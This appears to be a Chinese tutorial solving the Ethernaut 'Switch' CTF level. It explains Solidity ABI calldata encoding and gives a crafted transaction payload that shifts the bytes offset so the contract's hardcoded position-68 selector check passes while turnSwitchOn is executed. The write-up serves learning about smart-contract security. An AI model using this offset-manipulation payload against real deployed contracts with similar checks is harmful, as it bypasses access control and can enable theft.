#  Ethernaut 题库闯关 - Switch 题解



Ethernaut 闯关投稿到 [Ethernaut 题库闯关](https://learnblockchain.cn/article/4578) 专栏， 欢迎订阅，本题是一个名为 `Switch` 的合约，把 `switchOn` 设置为 true 则挑战成功， 难度等级：难。



Switch 合约如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        //  将复杂的数据类型放入内存中
        bytes32[1] memory selector;
        // 检查位置（_data的位置）68处的calldata数据
        assembly {
            calldatacopy(selector, 68, 4) // //从calldata中抽取出函数选择器
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}
```



通过本挑战，更好地让我们跟深刻的理解 calldata Calldata的编码。



## 分析合约

`Switch` 合约只有这3个可以从外部调用的函数：**flipSwitch**、**turnSwitchOn**和**turnSwitchOff**。

但是**flipSwitch** 是唯一可以调用的函数，因为**turnSwitchOn**和**turnSwitchOff**只有在`msg.sender`是当前合约时才能访问（因为**onlyThis** 修改器）。

让我们来看看你可以调用的函数：

```solidity
 function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }
```

你可以看到**flipSwitch**有一个函数修改器`onlyOff`， 此函数修改器对Calldata（calldata）进行检查。

```solidity
modifier onlyOff() {
        // 将复杂的数据类型放入内存中
        bytes32[1] memory selector;
        // 检查位置（_data的位置）68处的calldata数据
        assembly {
            calldatacopy(selector, 68, 4) //从calldata中抽取函数选择器
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }
```

函数修改器检查从位置 68 开始并且长度为4字节的数据是否是`turnOffSwitch`函数的选择器。

乍一看 ,**flipSwitch**只能在**turnSwitchOff**作为数据的情况下调用，但通过操纵[calldata](https://www.quicknode.com/guides/ethereum-development/transactions/ethereum-transaction-calldata/)编码，你会发现不是这样的。



如何解题呢？如果你要挑战一下，可以暂停一下...



## 温习 calldata 编码

### 静态类型的 calldata编码

静态类型如下：

- `uint` 等
- `int` 等
- `address`
- `bool`
- `bytes32` 等
- `tuples` 等

这些类型的表示是用十六进制表示的，用零填充以覆盖32字节。

```
Input: 23 (uint256)
Output:
0x000000000000000000000000000000000000000000000000000000000000002a
```

```
Input: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f (address of Uniswap)
Output: 
0x000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f
```

#### 动态类型的calldata编码(string, bytes 和数组)

对于动态类型，calldata编码基于以下内容：

- 前32个字节表示偏移量
- 接下来的32个字节是数据长度
- 继续接下来的是值（内容）

#### 示例

1. **Bytes:**

```
Input: 0x123

Output: 
0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
```

其中:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020

length(the value is 2 bytes length = 4 chrs):
0000000000000000000000000000000000000000000000000000000000000002

value(the value of string and bytes starts right after the length):
1234000000000000000000000000000000000000000000000000000000000000
```

**2. String:**

```
Input: “GM Frens”

Output: 
0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000008474d204672656e73000000000000000000000000000000000000000000000000
```

其中:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020 

length:
0000000000000000000000000000000000000000000000000000000000000008 

value(“GM Frens” in hex):
474d204672656e73000000000000000000000000000000000000000000000000 
```

**3. Arrays**

```
Input: [1,3,42] → uint256 array

Output:
0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000002a
```

其中:

```
offset:
0000000000000000000000000000000000000000000000000000000000000020 

length (3 elements in the array):
0000000000000000000000000000000000000000000000000000000000000003 

first element value(1):
0000000000000000000000000000000000000000000000000000000000000001 

second element value(3):
0000000000000000000000000000000000000000000000000000000000000003 

third element value(42):
000000000000000000000000000000000000000000000000000000000000002a 
```

一个调用合约方法的calldata 数据示例（不是解决方案）：

```
0x
30c13ade
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
```

其中:

```
function selector（函数选择器）: 
30c13ade

offset:
0000000000000000000000000000000000000000000000000000000000000020 

length:
0000000000000000000000000000000000000000000000000000000000000004 

value:
20606e1500000000000000000000000000000000000000000000000000000000
```

#### 什么是偏移量？

偏移量表示数据从哪里开始。数据由长度和值组成。在我们的例子中，偏移量是十六进制的20，也就是十进制的32。这意味着我们的数据在编码开始后的32个字节之后开始的。

```typescript
0000000000000000000000000000000000000000000000000000000000000020
^
| -> 从这里开始数 32 个字节


0000000000000000000000000000000000000000000000000000000000000004
^
| 从这里开始真实的数据 


20606e1500000000000000000000000000000000000000000000000000000000
```

让我们看一个同时具有静态和动态参数的函数calldata的示例：

```typescript
pragma solidity 0.8.19;
contract Example {
    function transfer(bytes memory data, address to) external;
}
```

具有以下参数：

```
data: 0x1234
to: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
```

使用 [Chaintool 交易输入数据(Calldata)编解码](https://chaintool.tech/calldata) 编码得到数据如下：

![chaintool - calldata 编码](https://img.learnblockchain.cn/pics/20230818152249.png!lbclogo)

生成以下calldata:

```
0xbba1b1cd00000000000000000000000000000000000000000000000000000000000000400000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f00000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
```



让我们来分析一下：

```
0x

函数选择器 (transfer):
bba1b1cd

 'data' 参数的数据偏移 (十进制 64 ):
0000000000000000000000000000000000000000000000000000000000000040 

'to' 参数地址:
0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f 

 'data' 参数的长度:
0000000000000000000000000000000000000000000000000000000000000002 

 'data' 参数的内容:
1234000000000000000000000000000000000000000000000000000000000000
```

正如你在本例中看到的，在偏移量的帮助下，你可以将数据内容（长度和值）移动到地址参数（to）之后。



## 解决方案

在`Switch`合约中，对`calldata`的检查是以硬编码值**68**的位置进行的。

因此，解决方案是把需要检查的数据移动到偏移位置 68。



**开始解题：**

我们先获取3 个函数： **flipSwitch**、**turnSwitchOn**和**turnSwitchOff** 的选择器，可以使用[Chaintool 选择器工具](https://chaintool.tech/querySelector)： 



![chaintool - 函数选择器查询](https://img.learnblockchain.cn/pics/20230818170808.png!lbclogo)



 **flipSwitch**、**turnSwitchOn**和**turnSwitchOff** 的选择器分别是`0x30c13ade`  `0x76227e12`   `0x20606e15`。



关于动态类型的Calldata编码， **需要记住的细节是**：

1. 存在偏移量（偏移量是Calldata中动态类型的实际数据开始的位置）
2. 通过更改偏移量，可以操作 calldata 数据的的起始位置

**解决方案：**

```javascript
await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

**数据说明：**

```
flipSwitch 函数:
30c13ade

offset, 现在是 96 个字节: 
0000000000000000000000000000000000000000000000000000000000000060 

额外的填充字节:
0000000000000000000000000000000000000000000000000000000000000000 

第 68 个字节的数据，进用于通过 onlyOff 检查:
20606e1500000000000000000000000000000000000000000000000000000000

数据长度:
0000000000000000000000000000000000000000000000000000000000000004 

将从我们的函数调用的数据，包含 turnSwitchOn 函数选择器
76227e1200000000000000000000000000000000000000000000000000000000 
```



恭喜你，完成了本次闯关。



通过本次闯关，让我们更好地理解 calldata 数据编码。

你对 Solidity 的理解又进了一步，



---



本文参考自：https://blog.softbinator.com/solving-ethernaut-level-29-switch/ 来自作者：[Bogdan Marin](https://blog.softbinator.com/author/bogdan-marin/)





MetaTrust Web3 CTF 
